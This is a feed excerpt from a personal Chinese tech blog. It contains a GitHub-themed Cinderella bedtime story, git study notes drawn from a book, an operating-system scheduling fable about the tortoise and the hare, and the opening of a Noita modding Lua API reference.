    <updated>2025-08-18T12:38:01.750Z</updated>
    
    <content type="html"><![CDATA[<p>在 GitHub 的茫茫仓库海洋里，有一个默默无闻的小姑娘。</p>
<p>她每天在继姐们的项目里修复小 bug、写小脚本或是回应issue，push 的 commit 总是埋在深深的 pull request 里，很少有人关注。她自己的仓库几乎空无一物，只有几个 watch，却存放着她暗暗打磨的梦想功能。</p>
<p>她的继姐们是开源圈的活跃账号，项目多到像星辰般闪耀，每一次 release 都引来成百上千的 stars。每次 Hackathon，继姐们总能被王子们邀请成为核心贡献者，而她只能在旁边默默看着。</p>
<p>由于账号十分简陋她被姐姐们与继母称为“灰姑娘”</p>
<p>一天，GitHub 王国宣布将举办一场盛大的 Hackathon 舞会，邀请所有开发者提交 Pull Request，为王子最爱的明星项目添砖加瓦。</p>
<p>灰姑娘想去，但她的电脑老旧，IDE 卡顿，连本地测试都运行得慢（注：即使这样也不会手写代码算结果的！）。她望着自己的 repo，轻叹：“我连参加舞会的资格都没有。”</p>
<p>就在这时，一个神秘的窗口出现在了显示器上，加载变换出一位仙女。</p>
<p>“你要去舞会吗？”仙女评论，带着调皮的 emoji。</p>
<p>“我……我想去，但环境不行。”灰姑娘回复。</p>
<p>仙女运行了一个魔法脚本，远程给她配置了最先进的云端开发环境，送给她一双“水晶鞋”——一个魔法般的 Personal Access Token，让她能轻松在王子的项目里提交 PR、合并分支，就像在舞会上自由舞动一般。</p>
<p>“记住，”这是仙女的最后一句话，在屏幕上闪着光，“这个开发环境只能用到午夜，过了时间，权限就会消失。”</p>
<p>舞会开始了。灰姑娘带着“水晶鞋”，在 Hackathon 中提交了第一个 PR。</p>
<p>她的代码像水晶一样透明优雅，函数命名温柔而精准，commit message 优美到像情诗。王子浏览了成百上千的提交，终于停在了她的 PR 上。</p>
<blockquote>
<p>“This is the most elegant code I’ve ever seen. Who are you?”</p>
</blockquote>
<p>王子在评论里留下这句惊叹。</p>
<p>灰姑娘的心怦怦跳，但午夜钟声逼近，Personal Access Token 开始闪烁红色警告——权限即将失效。</p>
<p>她连忙 merge 自己的分支 pull 到自己的仓库，却还是被迫下线，GitHub 显示 “This user is offline”。PR 留下的唯一线索，是那条闪亮的 commit hash，像水晶鞋遗落在王子的世界里。</p>
<p>王子焦急地遍寻整个仓库，试图找到她的身份。他发出公告：</p>
<p>“谁能用这个 hash 复现同样优雅的代码，我就与谁共建项目。”</p>
<p>能和王子共建项目，意味着大量的star与无上的荣誉，王国里的每个人都跃跃欲试。</p>
<p>灰姑娘的姐姐们也不例外，她们拼命地穷举SHA-1，寄希望于找到符合哈希的代码，却注定徒劳，只得到了几个接近的。</p>
<p>起初，王子看到相似的commit哈希，立刻想把灰姑娘的姐姐加为新项目的collaborator，可他仔细一看，commit的内容就像一坨base64，完全没有可读性，哈希值也不完全一样</p>
<p>就在此时，灰姑娘向王子push了她的commit，完美复现了那段逻辑，一模一样的SHA-1。王子见了，立刻高兴地喊到：“我找到了，你就是我要找的collaborator”</p>
<p>自那以后，他们开始互相 follow，star 对方的仓库，review 对方的提交。每一次 merge、每一次 commit，都像悄悄写下的情书。</p>
<p>随着时间流逝，灰姑娘不再默默无闻，她的仓库渐渐亮起了星光。王子在自己的 README 里写下：</p>
<blockquote>
<p>“Special thanks to the one who made every release better.”</p>
</blockquote>
<p>最终，他们成为项目的核心维护者，每天都在彼此的 commit history 里留下痕迹，他们维护的分支，就像他们的感情，纠缠交织、难舍难分。</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;在 GitHub 的茫茫仓库海洋里，有一个默默无闻的小姑娘。&lt;/p&gt;
&lt;p&gt;她每天在继姐们的项目里修复小 bug、写小脚本或是回应issue，push 的 commit 总是埋在深深的 pull request 里，很少有人关注。她自己的仓库几乎空无一物，只有几个</summary>
        
      
    
    
    
    <category term="睡前故事" scheme="https://aucept.in/categories/%E7%9D%A1%E5%89%8D%E6%95%85%E4%BA%8B/"/>
    
    
    <category term="睡前故事" scheme="https://aucept.in/tags/%E7%9D%A1%E5%89%8D%E6%95%85%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>git 学习笔记</title>
    <link href="https://aucept.in/2025/08/11/git-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://aucept.in/2025/08/11/git-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2025-08-11T13:16:09.000Z</published>
    <updated>2025-10-09T06:05:04.713Z</updated>
    
    <content type="html"><![CDATA[<p>内容来源：</p>
<ul>
<li>书名：Git从入门到精通</li>
<li>作者：高见龙</li>
<li>出版社：北京大学出版社<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="设置用户信息"><a href="#设置用户信息" class="headerlink" title="设置用户信息"></a>设置用户信息</h3><code>git config --global user.name &quot;Auceptin&quot;</code></li>
</ul>
<p><code>git config --global user.email &quot;me@aucept.in&quot;</code> </p>
<p><code>git config --list</code>可以查看当前设置</p>
<p>如果想为某个项目设定单独的作者，把global参数换成local</p>
<h3 id="设置别名（缩写）"><a href="#设置别名（缩写）" class="headerlink" title="设置别名（缩写）"></a>设置别名（缩写）</h3><p><code>git config --global alias.co checkout</code>这样就可以让co等同于checkout</p>
<p>也可以直接去/.gitconfig文件里改</p>
<h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p><code>git init</code>在项目目录里执行，初始化git，生成一个隐藏的./git文件夹，里面有git生效的全部信息</p>
<h3 id="获取状态"><a href="#获取状态" class="headerlink" title="获取状态"></a>获取状态</h3><p><code>git status</code>拿手头的项目试一下：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> D:<span class="token punctuation">\</span>steam<span class="token punctuation">\</span>steamapps<span class="token punctuation">\</span>common<span class="token punctuation">\</span>Noita<span class="token punctuation">\</span>mods<span class="token punctuation">\</span>Noita_Kirous<span class="token operator">></span> <span class="token function">git</span> status
On branch master
Your branch is up to <span class="token function">date</span> with <span class="token string">'origin/master'</span><span class="token builtin class-name">.</span>

Changes not staged <span class="token keyword">for</span> commit:
  <span class="token punctuation">(</span>use <span class="token string">"git add &lt;file>..."</span> to update what will be committed<span class="token punctuation">)</span>
  <span class="token punctuation">(</span>use <span class="token string">"git restore &lt;file>..."</span> to discard changes <span class="token keyword">in</span> working directory<span class="token punctuation">)</span>
        modified:   files/enemy/animal_maggot_tiny_mode/endless/level_endless/death.lua                                                                                                

no changes added to commit <span class="token punctuation">(</span>use <span class="token string">"git add"</span> and/or <span class="token string">"git commit -a"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>当前所在分支，版本状态和未提交的修改内容</p>
<h3 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h3><p>一切修改都在工作目录里完成，而完成提交需要先转移到暂存区，再转移到存储库中。</p>
<p>注意：Git在计算、产生对象时，是根据“文件的内容”进行计算的，所以只是新增一个目录的话，Git是无法处理它的。</p>
<p>将修改的文件加入暂存区：</p>
<p><code>git add filename.md</code>，支持通配符<code>git add *.md</code>，或者<code>git add .</code>把当前目录下的所有加进暂存区，或者<code>git add --all</code>，把整个项目文件都加进去</p>
<p>提交到存储库：</p>
<p><code>git commit -m &quot;改动描述&quot;</code>改动描述默认是必须的，否则需要<code>--allow-empty</code>参数</p>
<p>合并add和commit可以<code>git commit -a -m &quot;update content&quot;</code>，增加一个-a参数，但是只适用于存储库中已有文件的修改，对新加入的文件无效</p>
<h3 id="查看历史"><a href="#查看历史" class="headerlink" title="查看历史"></a>查看历史</h3><p>git会保留一个项目的历史信息，从github上pull下来后也默认有这些信息</p>
<p><code>git log</code>查看每一次提交的信息，这一环节是推荐用图形化界面看的，因为清晰。大部分IDE都有集成git图形化的功能</p>
<p>筛选某个作者的提交<code>git log --oneline --author=&quot;Sherly&quot;</code>可以使用<code>|</code>或符号，但是需要加上转义，像这样<code>git log --oneline --author=&quot;Sherly\|Eddie&quot;</code></p>
<p>筛选提交描述词<code>git log --oneline --grep=&quot;LOL&quot;</code></p>
<p>按时间筛选<code>git log --oneline --since=&quot;9am&quot; --until=&quot;12am&quot; --after=&quot;2017-01&quot;</code></p>
<p>查看单独一个文件<code>git log welcome.html</code></p>
<h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><p>方案一是删除文件后把该文件提交到暂存区，两个步骤，也可以用<code>git rm filename</code></p>
<p>以上工作目录里对应文件也会一并删掉，如果只想从暂存区里删掉，不动工作目录<code>git rm welcome --cached</code>用—cached参数</p>
<h3 id="改文件名"><a href="#改文件名" class="headerlink" title="改文件名"></a>改文件名</h3><p>直观的方式仍然是在工作目录直接改名再提交，本质是删一个文件再加一个文件，也可以用<code>git mv hello.html world.html</code>把hello.html改成world.html</p>
<p><strong>文件的名称不重要</strong>，Git是根据文件的“内容”来计算SHA-1的值，所以文件的名称不重要，重要的是文件的内容。当更改文件名时，Git并不会为此做出一个新的Blob对象，而只是指向原来的那个Blob对象。但因为文件名变了，所以Git会为此做出一个新的Tree对象</p>
<h3 id="修改commit描述内容"><a href="#修改commit描述内容" class="headerlink" title="修改commit描述内容"></a>修改commit描述内容</h3><p><code>git commit --amend -m &quot;Something_overwrite&quot;</code></p>
<h3 id="追加一点修改到上一次commit"><a href="#追加一点修改到上一次commit" class="headerlink" title="追加一点修改到上一次commit"></a>追加一点修改到上一次commit</h3><p>如果不想为了一点微小的改动增加一次commit，比如修改了一下a.c文件，就可以先把它加到暂存区，再<code>git commit --amend --no-edit</code></p>
<h3 id="gitignore"><a href="#gitignore" class="headerlink" title="gitignore"></a>gitignore</h3><p>某些文件不想提交上去，用此文件标记：<br><pre class="line-numbers language-none"><code class="language-none"># 忽略secret.yml文件
secret.yml
# 忽略config目录下的database.yml文件
config&#x2F;database.yml
# 忽略db目录下所有后缀是 .sqlite3的文件
&#x2F;db&#x2F;*.sqlite3
# 忽略所有后缀是 .tmp的文件
*.tmp
# 如果想要忽略.gitignore这个文件也可以，只是通常不会这么做
# .gitignore<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><code>git add -f 文件名称</code>中，f应该是force，要高过gitignore文件的效果</p>
<p>对创建前已经存在于暂存区的文件无效，需要用<code>git rm --cached</code>清出去</p>
<h3 id="出bug后的清算时间"><a href="#出bug后的清算时间" class="headerlink" title="出bug后的清算时间"></a>出bug后的清算时间</h3><p><code>git blame filename</code>可以看到每行代码最后修改于谁、哪次提交</p>
<h3 id="挽回"><a href="#挽回" class="headerlink" title="挽回"></a>挽回</h3><p><code>git checkout cinderella.html</code>将指定文件恢复回来，同样可以使用通配符：<code>git checkout .</code></p>
<p><code>git reset XXX</code>回退到XXX次提交，这个细节比较多</p>
<p>首先需要理解<code>HEAD</code>，它像一个指向分支的指针，一个提交历史可能像这样：<br><code>A-&gt;B-&gt;C</code>HEAD默认就指向C，表示接下来的修改接续在C后面</p>
<p>依据切换时是否舍弃工作目录、暂存区，reset分为三种模式，<code>git reset --soft</code>保留工作目录和暂存区的修改<code>git reset --mixed</code>，舍弃暂存区，保留工作目录（默认）和<code>git reset --hard</code>，丢弃所有未提交的改动</p>
<p><code>git reset HEAD^</code>中<code>^</code>表示前一次，这条指令的含义就是reset到前一次提交，这是相对定位，或者<code>git reset 85e7e30</code></p>
<p>commit不会因为reset消失，但会无法通过log查看，可以通过reflog获取一些信息<code>git reflog</code>展示HEAD移动信息</p>
<h3 id="SHA-1"><a href="#SHA-1" class="headerlink" title="SHA-1"></a>SHA-1</h3><p>SHA-1（Secure Hash Algorithm 1）是一种杂凑算法，计算之后的结果通常会以40个十六进制的数字形式呈现。该算法的特点之一，就是只要输入一样的值，就会有一样的输出值；反之，如果输入不同的值，就会有不同的输出值。Git中所有对象的编号都是靠这种算法产生的。</p>
<p>在Git中，不同种类对象的SHA-1值的计算方法会稍微有些不同。例如，Blob对象的SHA-1组成模式如下：</p>
<pre><code>（1）“blob”字样。
（2）一个空白字节。
（3）输入内容的长度。
（4）Null结束符号。
（5）输入内容。
</code></pre><p>一个重要信息是与时间、设备等都无关，只与文件内容有关</p>
<h2 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h2><h3 id="四种对象"><a href="#四种对象" class="headerlink" title="四种对象"></a>四种对象</h3><p>在Git中，有4种很重要的对象，分别是Blob对象、Tree对象、Commit对象以及Tag对象。</p>
<p>Blob（Binary large object），对一个文件进行SHA-1后就可以存到git目录，得到的40个字符中，前两个作为目录，后38个作为文件名，文件内容是压缩过的，可以用<code>git cat-file -p 30ab28d3acb37f96ad61ad8be82c8da46d0a7307</code>查看，把<code>-p</code>换成<code>-t</code>可用来查询对象类型</p>
<p>重复：git只对“内容”有兴趣，察觉不到空目录</p>
<p>Tree，目录及文件的名称将以Tree对象的形式存放，Blob只存放文件内容。会形成一个有向无环图</p>
<p>Commit，记录了根目录tree对象，提交信息</p>
<p>总结：</p>
<p>（1）把文件加入Git之后，文件的内容会被转成Blob对象存储。</p>
<p>（2）目录及文件名会存放在Tree对象内，Tree对象会指向Blob对象或者其他的Tree对象。</p>
<p>（3）Commit对象会指向某个Tree对象。除了第一个Commit，其他的Commit都会指向前一次的Commit对象。</p>
<p>（4）Tag对象（Annotated Tag）会指向某个Commit对象。</p>
<p>（5）分支虽然不属于这4种对象之一，但它会指向某个Commit对象。</p>
<p>（6）往Git服务器上推送之后，在.git/refs下就会多出一个remote目录，里面放的是远端的分支，基本上与本地的分支类似，同样也会指向某个Commit对象。</p>
<p>（7）HEAD也不属于这4种对象之一，它会指向某个分支。</p>
<p>在checkout时，git会根据当前commit对象，把所有对象抽出来</p>
<h3 id="其它细节"><a href="#其它细节" class="headerlink" title="其它细节"></a>其它细节</h3><p>git不做差异备份，会浪费空间，有垃圾回收机制但空间不是git考虑的主要问题</p>
<h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><p><code>git branch</code>查看所有分支</p>
<p><code>git branch newBranch</code>新增一个分支（不切换）</p>
<p>给分支改名<code>git branch -m newBranch Auceptin</code>用-m参数</p>
<p>删除分支<code>git branch -d Auceptin</code>用-d参数，如果没合并会提示，换成-D强制执行。当前所在分支不能删，此外均可</p>
<p>切换分支<code>git checkout master</code>如果分支不存在，加上-b参数默认新建分支</p>
<p>分支从名字容易理解为项目的分叉，从实际实现上应当理解为一个贴纸，贴在commit上，被HEAD指向并移动。而其本质是40个字节（某个Commit的SHA-1值），所以新建分支开销极小，删掉分支也不会影响commit</p>
<p>合并分支<code>git merge Branch1</code>，效果是把Branch1合并到当前所在分支。如果有两个从master分出的分支a和b要合并，他们不存在谁是谁的子集，git就会新建一个commit再整合到一起（如果没有冲突）。有子集关系直接换贴纸就好了，或者加上<code>--no-ff</code>参数也会新增一个commit</p>
<p><code>git reset HEAD^ --hard</code>撤回</p>
<p>rebase合并<code>git rebase Branch</code>，把分叉以后得提交嫁接到Branch分支上，但是原本的分支并没有消失，只是不可达了</p>
<p>rebase的撤回不同，可以用reflog找回不可达的commit</p>
<p>回溯时间，回到以前的commit重新分叉，可以checkout后再commit，也可以<code>git branch bird 657fce7</code>，含义是在657fce7这个commit上新增一条名为bird的分支</p>
<h2 id="冲突"><a href="#冲突" class="headerlink" title="冲突"></a>冲突</h2><p>大致git呈现出的是这样的：<br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD      
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span> 我是Cat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
=======      
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span> 我是Dog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
>>>>>>> dog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>先指明HEAD当前分支，===分割线，后面是另一个分支</p>
<p>把不想要的内容和标记删掉即可，然后重新加到暂存区并commit，如果是rebase就是git rebase —continue</p>
<p>如果是非文本文件，比如图片文件冲突，<code>git checkout --ours a.jpg</code>或者<code>git checkout --theirs a.jpg</code></p>
<h2 id="修改历史"><a href="#修改历史" class="headerlink" title="修改历史"></a>修改历史</h2><p>—amend参数可以修改最后一次commit，如果想回溯更久的历史，需要用git rebase</p>
<p><code>git rebase -i bb0c9c2</code>其中<code>-i</code>参数表示进入互动模式，范围是从bb0c9c2到当前提交。在互动模式的记录中，由上而下是从最旧到最新，与git log指令所呈现的结果是相反的。修改内容限于commit的描述信息，SHA-1值会全部改变</p>
<p><code>git reset ORIG_HEAD --hard</code>撤回</p>
<p>用图形化的界面要方便很多</p>
<p>合并多次提交：进入交互模式后，把pick改成squash就可以和上一个commit合并，commit信息重写</p>
<p>拆分，同上，把pick改成edit，git reset HEAD^然后重新加进暂存区、提交</p>
<p>revert reset 和 rebase</p>
<p>revert是新增一个commit，内容是还原到上一个commit，一种过于礼貌的修改，但是适用于已经push之后的修改</p>
<p>reset把当前状态设置为指定commit</p>
<p>rebase如上，功能丰富</p>
<h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p>标签和branch一样也是指向commit的一个指向标，一般用于记录版本号等，做里程碑用</p>
<p>分为轻量标签和有附注的标签，添加轻量标签<code>git tag 1.0.0 51d54ff</code>把1.0.0标签贴到51d54ff这个commit上，默认加到当前commit。增加<code>-a</code>参数变为有附注的标签<code>-m &quot;something&quot;</code>标签增加内容，类似于commit</p>
<p>有附注的标签主要用作软件版本号等，而轻量标签则是用于个人使用或暂时标记。前者会记录谁在什么时候贴了这张标签，后者不会</p>
<p><code>git tag -d tag_name</code>用-d（delete）参数清理</p>
<p>标签与分支的区别是，分支会随着Commit而移动，但标签不会。</p>
<h2 id="其他功能"><a href="#其他功能" class="headerlink" title="其他功能"></a>其他功能</h2><h3 id="手边的工作做到一半，临时要切换到别的任务"><a href="#手边的工作做到一半，临时要切换到别的任务" class="headerlink" title="手边的工作做到一半，临时要切换到别的任务"></a>手边的工作做到一半，临时要切换到别的任务</h3><p>先提交已经完成的修改，切换分支，修改后<code>$ git reset HEAD^</code>回来</p>
<p>也可以用stash功能，暂存当前修改<code>git stash</code>然后用<code>git stash list</code>查看已经存的，用<code>git stash pop stash@&#123;2&#125;</code>这样一条指令恢复，默认0号stash，pop之后就没了</p>
<h3 id="提交了私密信息"><a href="#提交了私密信息" class="headerlink" title="提交了私密信息"></a>提交了私密信息</h3><p><del>掀桌子，删git目录</del></p>
<p>Rebase到提交前再逐个commit编辑，或者 <code>git filter-branch</code>批量编辑，比如<code>git filter-branch --tree-filter &quot;rm -f config/database.yml&quot;</code></p>
<p>撤回<code>git reset refs/original/refs/heads/master --hard</code></p>
<p>如果已经push上去了就只能 filter-branch后<code>git push-f</code></p>
<h3 id="资源回收"><a href="#资源回收" class="headerlink" title="资源回收"></a>资源回收</h3><p>文件进了git想走就困难了，首先要让对应commit不可达，即没有标签打在顶上或其根其它commit，然后还要让reflog也忘掉，默认三十天，或者<code>git reflog expire --all --expire=now</code></p>
<p><code>git fsck --unreachable</code>列出真正不可达的commit，<code>git gc</code>喊来垃圾车，但是依然不会立刻运走，而是等到过期<code>git gc --prune=now</code>才可以</p>
<h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><p>设置远端节点<br><code>git remote add origin git@github.com:kaochenlong/practice-git.git</code>其中origin是个代名词，换成随便别的什么都可以</p>
<p>推送<code>git push -u origin master</code>，完成的工作是：</p>
<blockquote>
<p>（1）把master分支的内容推向origin位置。<br>（2）在origin远端服务器上，如果master不存在，就创建一个名为master的分支。<br>（3）如果服务器上存在master分支，就会移动服务器上master分支的位置，使它指到当前最新的进度上。</p>
</blockquote>
<p><code>-u</code>参数，表示upstream上游，。在Git中，每个分支可以设置一个上游（最多也只有一个）下次执行git push指令时，就会用它来当默认值，可以使用<code>git push</code>没有<code>origin main</code>了。</p>
<p><code>git fetch</code>只拉不合并</p>
<p><code>git pull</code>拉下来自动合并 = git fetch + git merge</p>
<p>冲突也是常有的，先拉再推是好习惯，<code>git push -f</code>强制推上去的话……至少代码的冲突解决了</p>
<p><code>git clone address</code>Clone指令通常只在第一次下载时使用，而之后的更新就只能使用Pull/Fetch指令了</p>
<p>PullRequest（PR）想参与一个项目但没有权限也要不到权限，可以：</p>
<blockquote>
<p>（1）先复制（Fork）一份原作者的项目到自己的GitHub账号下。<br>（2）因为复制的项目已经在自己的GitHub账号下，所以就有了完整的权限，可以随意更改。<br>（3）改完后，将自己账号下的项目推送（Push）上去。<br>（4）发个通知，让原作者知道你帮忙做了一些事情，请他看一下。<br>（5）原作者看完后如果觉得可以，就会把你做的这些修改合并（Merge）到他的项目中。<br>其中，步骤（4）中的那个“通知”，就是发送一个请原作者拉回去（Pull）的请求（Request），称为PR（Pull Request）。</p>
</blockquote>
<p>但是遇到进度落后会比较麻烦，重新fork有效好用但是比较笨，正确做法是把原作者的项目设置成上游项目，Fetch回来后再手动合并。</p>
<p><code>git push origin master:cat</code>把本地的master分支推上去之后，在服务器上创建cat分支，去掉master，<code>git push origin :cat</code>用空白区覆盖cat分支，实现了删除效果</p>
<p>在大型项目多人合作，分支如果不加以约定会变得十分混乱，于是有了git flow这种东西，规定每个分支的功能</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;内容来源：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;书名：Git从入门到精通&lt;/li&gt;
&lt;li&gt;作者：高见龙&lt;/li&gt;
&lt;li&gt;出版社：北京大学出版社&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="学习生活" scheme="https://aucept.in/categories/%E5%AD%A6%E4%B9%A0%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="git" scheme="https://aucept.in/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>git 学习笔记</title>
    <link href="https://aucept.in/2025/08/11/heap%E5%AD%A6%E4%B9%A0/"/>
    <id>https://aucept.in/2025/08/11/heap%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-08-11T13:16:09.000Z</published>
    <updated>2026-01-22T15:04:27.136Z</updated>
    
    
    
    
    <category term="ctf" scheme="https://aucept.in/categories/ctf/"/>
    
    
    <category term="pwn" scheme="https://aucept.in/tags/pwn/"/>
    
    <category term="heap" scheme="https://aucept.in/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>睡前故事：龟兔赛跑</title>
    <link href="https://aucept.in/2025/08/05/%E9%BE%9F%E5%85%94%E8%B5%9B%E8%B7%91/"/>
    <id>https://aucept.in/2025/08/05/%E9%BE%9F%E5%85%94%E8%B5%9B%E8%B7%91/</id>
    <published>2025-08-05T14:21:57.000Z</published>
    <updated>2025-12-23T07:56:28.033Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个有关时间片分配的故事</p>
<p>从前，在名为os的森林里有两个进程，一个名兔子，它运行起来cpu一直在转；一只名乌龟，它经常要与其它设备交互，平均每个时间片只有1%在运算，而剩下的99%都在阻塞</p>
<p>某天，os将乌龟与兔子调度到了同一个cpu上，它们相约同时开始计算一个很大的哈希，比一比谁先返回。</p>
<p>起初，兔子和乌龟都在最高优先级的队列中，兔子、先拿到了一个时间片。几毫秒的时间里cpu飞快地运转，很快这个哈希值就要算完了，可惜时间片结束了，因为兔子一直在占用cpu，它的优先级被降低了一位。</p>
<p>接下来轮到了乌龟，乌龟每算几个字符都要阻塞很久，这不，刚才阻塞中恢复，时间片就结束了。因为cpu使用时间不长，乌龟的优先级没有降低。</p>
<p>下一个时间片到来了，兔子正摩拳擦掌准备一鼓作气算完，却发现os把时间片分给了乌龟——乌龟现在的优先级比兔子高</p>
<p>接下来兔子等啊等，希望某一次时间片结束时乌龟还在阻塞，这样它就能一举追回优势，然而乌龟慢吞吞地行动背后有着精妙的设计，每次时间片结束时都恰好刚从阻塞中恢复，开始cpu计算，于是时间片一直被把持着</p>
<p>兔子眼巴巴地盯着乌龟，就在它已接受即将饿死的事实时，突然，新一轮调度完成，兔子获得了一个时间片，惊喜中兔子奋力一冲，算完了这个哈希——但回头一看，进程表里哪里还有什么乌龟，它已经算完哈希结束了！</p>
<p>就像原版的故事中，兔子输掉不是因为跑得快，而是莫名其妙的贪睡设定一样，本文中兔子输掉也不是因为它cpu密集，而是简单的MLFQ策略确实存在着这样的漏洞，所以后续设计师们增加了更复杂的策略来避免，但在故事发生时，这还都不存在</p>
<p>望着空荡荡的进程表的兔子在想什么呢？快并不代表拥有，久等并不意味着机会，它说，它要学着顺应操作系统的规则</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;这是一个有关时间片分配的故事&lt;/p&gt;
&lt;p&gt;从前，在名为os的森林里有两个进程，一个名兔子，它运行起来cpu一直在转；一只名乌龟，它经常要与其它设备交互，平均每个时间片只有1%在运算，而剩下的99%都在阻塞&lt;/p&gt;
&lt;p&gt;某天，os将乌龟与兔子调度到了同一个cpu上，它们相</summary>
        
      
    
    
    
    <category term="睡前故事" scheme="https://aucept.in/categories/%E7%9D%A1%E5%89%8D%E6%95%85%E4%BA%8B/"/>
    
    
    <category term="睡前故事" scheme="https://aucept.in/tags/%E7%9D%A1%E5%89%8D%E6%95%85%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>noita_api</title>
    <link href="https://aucept.in/2025/07/29/noita-api/"/>
    <id>https://aucept.in/2025/07/29/noita-api/</id>
    <published>2025-07-29T09:00:00.000Z</published>
    <updated>2025-10-04T05:16:55.559Z</updated>
    
    <content type="html"><![CDATA[<p><span style = "font-size: 30px; font-weight: 900">一个 noita API使用参考文档 </span></p>
<p>noita的api只提供了参数和返回值，大多都没写具体效果，<a href="https://noita.wiki.gg/zh/wiki/Mod:Lua_API">noita wiki</a>里的差点意思，故有本文</p>
<p>lua_api_documentation.txt文件版本：<code>Current modding API version: 12</code>，共注明了405个，其中16个注明deprecated，本文忽略,当前进度：208/389</p>
<div class="note danger flat"><p>开销测量因环境与上下文而异，仅供参考</p>
</div>
<h2 id="调试相关"><a href="#调试相关" class="headerlink" title="调试相关"></a>调试相关</h2><h3 id="GamePrint"><a href="#GamePrint" class="headerlink" title="GamePrint"></a><code>GamePrint</code></h3><blockquote>
<p>GamePrint( log_line:string )</p>
</blockquote>
<p>参数是一个字符串（数字也可以），效果为在游戏左下角输出，测得开销约为0.9秒/百万次。noita每秒60帧，也就是每帧16毫秒，不到20000次输出</p>
<p>属于比较轻量的输出，每帧调用几千次不会造成明显影响</p>
<h3 id="GamePrintImportant"><a href="#GamePrintImportant" class="headerlink" title="GamePrintImportant"></a><code>GamePrintImportant</code></h3><blockquote>
<p>GamePrintImportant( title:string, description:string = “”, ui_custom_decoration_file:string = “” )</p>
</blockquote>
<p>三个字符串参数，标题、描述和ui装饰</p>
<p>第一个显示在框里，触怒神明等，第二个显示在框下，第三个改变框的ui，默认为触怒神明时的那种，需要一个图片的路径，如：”data/ui_gfx/decorations/3piece_fungal_shift.png”可以换为真菌转化的ui</p>
<p>有几秒的固定持续时间，不会被后来的覆盖掉，超出一定时间限制的会被丢弃</p>
<h3 id="GameGetRealWorldTimeSinceStarted"><a href="#GameGetRealWorldTimeSinceStarted" class="headerlink" title="GameGetRealWorldTimeSinceStarted"></a><code>GameGetRealWorldTimeSinceStarted</code></h3><blockquote>
<p>GameGetRealWorldTimeSinceStarted() -&gt; number</p>
</blockquote>
<p>返回自游戏开始的时间，单位是秒，小数点后保留7位</p>
<h3 id="GameGetFrameNum"><a href="#GameGetFrameNum" class="headerlink" title="GameGetFrameNum"></a><code>GameGetFrameNum</code></h3><blockquote>
<p>GameGetFrameNum() -&gt; int</p>
</blockquote>
<p>返回一个整数，游戏开始到当前的帧数（每秒上限60帧）</p>
<h3 id="GameGetDateAndTimeUTC"><a href="#GameGetDateAndTimeUTC" class="headerlink" title="GameGetDateAndTimeUTC"></a><code>GameGetDateAndTimeUTC</code></h3><blockquote>
<p>GameGetDateAndTimeUTC() -&gt; year:int,month:int,day:int,hour:int,minute:int,second:int</p>
</blockquote>
<p>返回六个整数，获取UTC日期时间</p>
<h3 id="GameGetDateAndTimeLocal"><a href="#GameGetDateAndTimeLocal" class="headerlink" title="GameGetDateAndTimeLocal"></a><code>GameGetDateAndTimeLocal</code></h3><blockquote>
<p>GameGetDateAndTimeLocal() -&gt;year:int,month:int,day:int,hour:int,minute:int,second:int</p>
</blockquote>
<p>同上，获取本地时间</p>
<h3 id="SetTimeOut"><a href="#SetTimeOut" class="headerlink" title="SetTimeOut"></a><code>SetTimeOut</code></h3><blockquote>
<p>SetTimeOut( time_to_execute:number, file_to_execute:string, function_to_call:string = nil )</p>
</blockquote>
<p>%rdi秒后执行，参数为：时间（秒），文件路径（绝对路径），要执行的文件里的函数名</p>
<p>使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">SetTimeOut</span><span class="token punctuation">(</span> <span class="token number">0.54</span><span class="token punctuation">,</span> <span class="token string">"data/scripts/buildings/egg_damage.lua"</span><span class="token punctuation">,</span> <span class="token string">"impl_spawn_boss_dragon"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>注1：此函数运行是非阻塞的，即执行到该函数时开始计时并立刻返回，计时完成后执行函数</p>
